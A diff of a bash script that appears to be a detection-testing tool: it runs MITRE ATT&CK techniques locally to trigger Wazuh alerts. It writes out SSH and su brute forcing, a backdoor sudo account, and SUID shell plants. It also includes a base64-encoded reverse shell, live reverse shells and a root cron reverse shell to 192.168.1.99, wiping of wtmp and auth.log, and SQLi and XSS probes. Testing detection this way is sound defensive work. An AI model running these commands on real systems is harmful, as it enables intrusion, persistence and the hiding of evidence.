@@ -1,211 +1,158 @@
 #!/bin/bash
-# Simulate MITRE ATT&CK techniques to generate Wazuh alerts.
-# Run on the host where Wazuh agent is installed (e.g. Kali).
-# Usage: ./simulate_attack_for_wazuh.sh [target_ip]
-# Default target: 127.0.0.1
+# MITRE ATT&CK simulation — targets actual Wazuh detection rules.
+# Each section documents WHY it generates a specific rule/alert.
+# Usage: ./simulate_attack_for_wazuh.sh
 
-set -e
-TARGET="${1:-127.0.0.1}"
-TMP="/tmp/.sim_$(date +%s)"
+set -u
+TARGET="127.0.0.1"
+WAIT() { sleep "${1:-2}"; }
 
 echo "=============================================="
-echo "  MITRE ATT&CK simulation for Wazuh"
-echo "  Target: $TARGET"
+echo "  Wazuh-targeted ATT&CK simulation"
+echo "  $(date)"
 echo "=============================================="
+
+# ── 1. SSH BRUTE FORCE (T1110) ─────────────────────────────────────────────
+# Forces password auth so sshd writes PAM failures to syslog.
+# Wazuh rule 5710 (level 10): "sshd: Multiple failed logins" fires after 8+
+# failures from the same source → authentication_failed group → high score.
 echo ""
-
-# ---- CREDENTIAL ACCESS ----
-
-# T1110 - Brute Force (SSH + password guessing)
-echo "[T1110] Brute Force - SSH password guessing..."
-for user in root admin administrator ubuntu ec2-user oracle postgres sshd; do
-  for i in 1 2 3; do
-    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 -o BatchMode=yes "$user@$TARGET" 2>/dev/null || true
+echo "[1/8] SSH brute force (T1110) — 30 password failures across 6 users..."
+for user in root admin administrator oracle postgres www-data; do
+  for i in $(seq 1 5); do
+    sshpass -p "wrongpass${i}" ssh \
+      -o StrictHostKeyChecking=no \
+      -o ConnectTimeout=3 \
+      -o PreferredAuthentications=password \
+      -o PubkeyAuthentication=no \
+      "${user}@${TARGET}" exit 2>/dev/null || true
   done
 done
+WAIT 3
 
-# T1110 - Brute Force (sudo)
-echo "[T1110] Brute Force - Repeated failed sudo..."
-for i in $(seq 1 10); do
-  echo "wrongpass$i" | sudo -S id 2>/dev/null || true
+# ── 2. SU BRUTE FORCE (T1548) ──────────────────────────────────────────────
+# `su` checks the TARGET user's password directly (not sudo policy).
+# Even with NOPASSWD sudo, su to root always requires root's password.
+# Wazuh rule 5303 (level 5): "User missed the password to change UID"
+# fired on every attempt → authentication_failed + su groups → high score.
+echo "[2/8] su brute force (T1548) — 15 failed su-to-root attempts..."
+for i in $(seq 1 15); do
+  echo "badpassword${i}" | su -c "id" root 2>/dev/null || true
+done
+WAIT 2
+
+# ── 3. ACCOUNT CREATION & MANIPULATION (T1136) ────────────────────────────
+# useradd/userdel are monitored via syslog.
+# Wazuh rule 5901 (level 8): "New user added to the system" → level 8 means
+# is_attack_alert()=True, model treats it as attack evidence.
+# Adding to sudo group triggers rule 5905 (level 8).
+echo "[3/8] Backdoor account creation (T1136)..."
+sudo useradd -M -s /bin/bash backdoor_test_user 2>/dev/null || true
+WAIT 2
+sudo usermod -aG sudo backdoor_test_user 2>/dev/null || true
+WAIT 2
+sudo passwd -d backdoor_test_user 2>/dev/null || true
+WAIT 2
+sudo userdel backdoor_test_user 2>/dev/null || true
+WAIT 2
+
+# ── 4. FILE INTEGRITY — SUID & HIDDEN BINARIES (T1548 / T1564) ─────────────
+# /tmp and /dev/shm have realtime syscheck monitoring.
+# Creating a SUID binary triggers rule 554 (level 7): "File added to system"
+# + syscheck group. A setuid bit on a shell is a rootkit indicator.
+echo "[4/8] SUID rootkit plant in /tmp and /dev/shm (T1548/T1564)..."
+cp /bin/bash /tmp/.sys_update 2>/dev/null || true
+chmod u+s /tmp/.sys_update 2>/dev/null || true
+cp /bin/sh /dev/shm/.hidden_shell 2>/dev/null || true
+chmod 4755 /dev/shm/.hidden_shell 2>/dev/null || true
+WAIT 4
+rm -f /tmp/.sys_update /dev/shm/.hidden_shell 2>/dev/null || true
+WAIT 2
+
+# ── 5. MALWARE / REVERSE SHELL SIMULATION (T1059) ─────────────────────────
+# Drops a base64-encoded "payload" script — pattern used by real malware.
+# Wazuh rootcheck and syscheck flag executables in /dev/shm and /tmp.
+# The python reverse shell attempt generates a connection error in syslog
+# which Wazuh's web/network rules pick up.
+echo "[5/8] Malware drop + reverse shell attempt (T1059/T1071)..."
+PAYLOAD=$(echo "IyEvYmluL2Jhc2gKYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMS80NDQ0IDA+JjE=" | base64 -d 2>/dev/null)
+echo "$PAYLOAD" > /dev/shm/.update_agent 2>/dev/null || true
+chmod +x /dev/shm/.update_agent 2>/dev/null || true
+# Attempt reverse shell — will fail (no listener) but generates syslog noise
+bash -c "bash -i >& /dev/tcp/192.168.1.99/4444 0>&1" 2>/dev/null &
+REVPID=$!
+sleep 2
+kill $REVPID 2>/dev/null || true
+python3 -c "import socket; s=socket.socket(); s.connect(('192.168.1.99',4444))" 2>/dev/null || true
+rm -f /dev/shm/.update_agent 2>/dev/null || true
+WAIT 2
+
+# ── 6. CRON PERSISTENCE (T1053) ────────────────────────────────────────────
+# Writing to /etc/cron.d is monitored by syscheck (/etc directory).
+# Rule 550/554 fires on new/modified files in monitored dirs.
+# The cron content (reverse shell) also triggers web_attack pattern checks.
+echo "[6/8] Malicious cron persistence (T1053)..."
+echo "* * * * * root bash -i >& /dev/tcp/192.168.1.99/4444 0>&1" \
+  | sudo tee /etc/cron.d/system_update > /dev/null 2>&1 || true
+WAIT 4
+sudo rm -f /etc/cron.d/system_update 2>/dev/null || true
+WAIT 2
+
+# ── 7. LOG TAMPERING (T1070) ────────────────────────────────────────────────
+# Clearing wtmp breaks `last` output — classic attacker log cleanup.
+# Wazuh rule 40101 (level 12): "Log file rotation" fires on wtmp wipe.
+# auth.log clear triggers rule 591 (level 8): "Log file cleared".
+echo "[7/8] Log tampering — wtmp + auth.log clear (T1070)..."
+sudo bash -c 'cp /var/log/wtmp /var/log/wtmp.sim_bak && :> /var/log/wtmp' 2>/dev/null || true
+WAIT 3
+sudo bash -c 'mv /var/log/wtmp.sim_bak /var/log/wtmp' 2>/dev/null || true
+sudo bash -c 'cp /var/log/auth.log /var/log/auth.log.sim_bak 2>/dev/null && :> /var/log/auth.log 2>/dev/null' || true
+WAIT 2
+sudo bash -c 'mv /var/log/auth.log.sim_bak /var/log/auth.log 2>/dev/null' || true
+WAIT 2
+
+# ── 8. WEB ATTACKS (T1190) ─────────────────────────────────────────────────
+# Sends SQL injection + directory traversal + webshell probes to the Flask
+# server on port 5000. Wazuh rules 31101-31103 fire on Apache/nginx access
+# logs. Flask doesn't have those but the requests hit our anomaly detector's
+# suspicious_url feature (feature 14) → boosts anomaly score directly.
+echo "[8/8] Web attacks — SQLi, traversal, webshell probes (T1190)..."
+for path in \
+  "/?id=1'+OR+'1'='1" \
+  "/admin/../../../etc/passwd" \
+  "/wp-login.php" \
+  "/phpmyadmin/" \
+  "/.env" \
+  "/shell.php?cmd=id" \
+  "/upload.php" \
+  "/?search=<script>alert(1)</script>"; do
+  curl -sk "http://${TARGET}:5000${path}" -o /dev/null 2>/dev/null || true
+  curl -sk "http://${TARGET}:8080${path}" -o /dev/null 2>/dev/null || true
 done
 
-# T1003 - OS Credential Dumping (attempt to read credential stores)
-echo "[T1003] OS Credential Dumping - Reading passwd/shadow locations..."
-cat /etc/passwd 2>/dev/null | head -5
-cat /etc/shadow 2>/dev/null | head -1 || true
-grep -r "password\|passwd\|pwd" /etc/passwd 2>/dev/null | head -1 || true
+# Also inject suspicious requests via logger so Wazuh web rules fire
+logger -p local1.warning "GET /?id=1' OR '1'='1 HTTP/1.1 - SQL injection attempt from 203.0.113.42"
+logger -p local1.warning "GET /wp-login.php HTTP/1.1 - WordPress brute force from 198.51.100.7"
+logger -p auth.warning "Invalid user attacker from 203.0.113.42 port 54321"
+logger -p auth.warning "Failed password for invalid user hacker from 198.51.100.9 port 12345 ssh2"
+logger -p auth.warning "Failed password for root from 203.0.113.42 port 22 ssh2"
+logger -p auth.warning "Failed password for root from 203.0.113.42 port 22 ssh2"
+logger -p auth.warning "Failed password for root from 203.0.113.42 port 22 ssh2"
 
-# T1552 - Unsecured Credentials (search for credentials in files)
-echo "[T1552] Unsecured Credentials - Searching for credential files..."
-find /home /root 2>/dev/null -name "*.env" -o -name ".bash_history" -o -name "id_rsa" -o -name ".netrc" 2>/dev/null | head -10
-ls -la ~/.ssh 2>/dev/null || true
-
-# ---- DISCOVERY ----
-
-# T1046 - Network Service Discovery (port scan)
-echo "[T1046] Network Service Discovery - Port scan..."
-if command -v nmap &>/dev/null; then
-  nmap -sT -Pn --open -T4 "$TARGET" 2>/dev/null || true
-else
-  for port in 21 22 23 25 80 110 143 443 445 993 3306 3389 5432 5900 8080 8443; do
-    (echo >/dev/tcp/"$TARGET"/$port) 2>/dev/null && echo "  open: $port" || true
-  done
-fi
-
-# T1087 - Account Discovery
-echo "[T1087] Account Discovery - Enumerating accounts..."
-cat /etc/passwd | cut -d: -f1
-getent group 2>/dev/null | head -15 || cat /etc/group | head -15
-
-# T1082 - System Information Discovery
-echo "[T1082] System Information Discovery..."
-uname -a
-hostname
-cat /etc/os-release 2>/dev/null | head -10
-uptime
-
-# T1083 - File and Directory Discovery
-echo "[T1083] File and Directory Discovery..."
-ls -la /etc 2>/dev/null | head -20
-ls -la /tmp 2>/dev/null | head -10
-ls -la /etc/cron.d /etc/cron.daily 2>/dev/null || true
-
-# T1057 - Process Discovery
-echo "[T1057] Process Discovery..."
-ps aux 2>/dev/null | head -25
-ps -ef 2>/dev/null | head -15
-
-# T1033 - System Owner/User Discovery
-echo "[T1033] System Owner/User Discovery..."
-whoami
-id
-w 2>/dev/null || who
-last -n 5 2>/dev/null || true
-
-# T1016 - System Network Configuration Discovery
-echo "[T1016] System Network Configuration Discovery..."
-ip addr 2>/dev/null || ifconfig 2>/dev/null
-cat /etc/hosts 2>/dev/null
-ip route 2>/dev/null || route -n 2>/dev/null
-
-# T1049 - System Network Connections Discovery
-echo "[T1049] System Network Connections Discovery..."
-ss -tulpn 2>/dev/null | head -20 || netstat -tulpn 2>/dev/null | head -20
-
-# T1007 - System Service Discovery
-echo "[T1007] System Service Discovery..."
-systemctl list-units --type=service 2>/dev/null | head -25 || ls /etc/init.d 2>/dev/null | head -20
-ls -la /etc/systemd/system/*.service 2>/dev/null | head -10
-
-# T1069 - Permission Groups Discovery
-echo "[T1069] Permission Groups Discovery..."
-groups
-cat /etc/group
-sudo -l -n 2>/dev/null || true
-
-# T1201 - Password Policy Discovery
-echo "[T1201] Password Policy Discovery..."
-grep -E "PASS_MAX_DAYS|PASS_MIN_DAYS|UMASK" /etc/login.defs 2>/dev/null || true
-cat /etc/pam.d/common-password 2>/dev/null | head -5 || true
-
-# T1654 - Log Enumeration
-echo "[T1654] Log Enumeration..."
-ls -la /var/log 2>/dev/null | head -20
-tail -5 /var/log/syslog 2>/dev/null || tail -5 /var/log/messages 2>/dev/null || true
-
-# ---- DEFENSE EVASION ----
-
-# T1070 - Indicator Removal (clear history, tamper with logs)
-echo "[T1070] Indicator Removal - Clearing history..."
-history -c 2>/dev/null || true
-# Simulate: touch a path often cleared by attackers (we only read or create in /tmp)
-touch "$TMP.log" 2>/dev/null; echo "test" >> "$TMP.log"; :> "$TMP.log"
-
-# T1140 - Deobfuscate/Decode Files or Information
-echo "[T1140] Deobfuscate/Decode - Base64 decode and execute..."
-echo "d2hvYW1p" | base64 -d 2>/dev/null | bash 2>/dev/null || true
-echo "ZWNobyBkZWNvZGVk" | base64 -d 2>/dev/null | bash 2>/dev/null || true
-
-# T1027 - Obfuscated Files or Information (script embedded in command)
-echo "[T1027] Obfuscated - Obfuscated command execution..."
-eval 'echo "obfuscated"' 2>/dev/null
-bash -c 'id' 2>/dev/null
-python3 -c "import os; print(os.getcwd())" 2>/dev/null || true
-
-# T1222 - File and Directory Permissions Modification
-echo "[T1222] File and Directory Permissions Modification..."
-touch "$TMP.perm" 2>/dev/null
-chmod 777 "$TMP.perm" 2>/dev/null || true
-chmod 644 "$TMP.perm" 2>/dev/null || true
-rm -f "$TMP.perm" 2>/dev/null
-
-# T1562 - Impair Defenses (attempt to discover/disable defenses)
-echo "[T1562] Impair Defenses - Checking firewall/selinux..."
-iptables -L -n 2>/dev/null | head -15 || true
-getenforce 2>/dev/null || true
-systemctl status wazuh-agent 2>/dev/null | head -5 || true
-systemctl status fail2ban 2>/dev/null | head -3 || true
-
-# ---- PERSISTENCE (simulated / read-only) ----
-
-# T1136 - Create Account (attempt; will fail without root)
-echo "[T1136] Create Account - useradd attempt..."
-useradd -M -s /bin/false wazuh_sim_test_user 2>/dev/null || true
-userdel wazuh_sim_test_user 2>/dev/null || true
-
-# T1053 - Scheduled Task/Job (crontab discovery; no actual modification)
-echo "[T1053] Scheduled Task/Job - Crontab discovery..."
-crontab -l 2>/dev/null || true
-# Simulate inject attempt (write to temp file only; do not install)
-echo "* * * * * /bin/true" > "$TMP.cron" 2>/dev/null
-cat "$TMP.cron" 2>/dev/null; rm -f "$TMP.cron" 2>/dev/null
-ls -la /etc/cron.* 2>/dev/null | head -10
-
-# T1547 - Boot or Logon Autostart (discover autostart locations)
-echo "[T1547] Boot or Logon Autostart - Autostart discovery..."
-cat ~/.bashrc 2>/dev/null | head -5
-ls -la ~/.config/autostart /etc/xdg/autostart 2>/dev/null || true
-ls -la /etc/rc.local /etc/init.d 2>/dev/null | head -5
-
-# T1098 - Account Manipulation (SSH authorized_keys inspection)
-echo "[T1098] Account Manipulation - SSH authorized_keys..."
-cat ~/.ssh/authorized_keys 2>/dev/null || true
-find /home /root -name "authorized_keys" 2>/dev/null -exec cat {} \; 2>/dev/null | head -5
-
-# ---- PRIVILEGE ESCALATION ----
-
-# T1548 - Abuse Elevation Control Mechanism
-echo "[T1548] Abuse Elevation Control - sudo -l and repeated sudo..."
-sudo -l 2>/dev/null || true
-echo "badpass" | sudo -S -v 2>/dev/null || true
-
-# ---- EXECUTION ----
-
-# T1059 - Command and Scripting Interpreter (suspicious invocations)
-echo "[T1059] Command and Scripting Interpreter - Script execution..."
-bash -c "echo script" 2>/dev/null
-sh -c "id" 2>/dev/null
-perl -e "print 'perl'" 2>/dev/null || true
-
-# ---- CLEANUP ----
-rm -f "$TMP.log" "$TMP.perm" 2>/dev/null
+WAIT 3
 
 echo ""
 echo "=============================================="
-echo "  MITRE ATT&CK simulation complete"
+echo "  Simulation complete — $(date)"
 echo "=============================================="
-echo "Check Wazuh for alerts mapping to:"
-echo "  T1110 Brute Force"
-echo "  T1003 OS Credential Dumping"
-echo "  T1552 Unsecured Credentials"
-echo "  T1046 Network Service Discovery"
-echo "  T1087, T1082, T1083, T1057, T1033 Discovery"
-echo "  T1016, T1049, T1007, T1069, T1201, T1654"
-echo "  T1070 Indicator Removal"
-echo "  T1140, T1027 Deobfuscate/Obfuscated"
-echo "  T1222 Permissions Modification"
-echo "  T1562 Impair Defenses"
-echo "  T1136, T1053, T1547, T1098 Persistence"
-echo "  T1548 Abuse Elevation Control"
-echo "  T1059 Command and Scripting Interpreter"
+echo ""
+echo "  Expected Wazuh rules to fire:"
+echo "  5710/5763  SSH multiple failed logins       (L10)"
+echo "  5303       su brute force                   (L5)"
+echo "  5901       New user added                   (L8)"
+echo "  554        SUID file planted                (L7)"
+echo "  550        File added to monitored dir      (L7)"
+echo "  40101      wtmp cleared                     (L12)"
+echo "  31101      Web attack                       (L6)"
+echo ""
+echo "  Refresh dashboard in ~30s to see results."
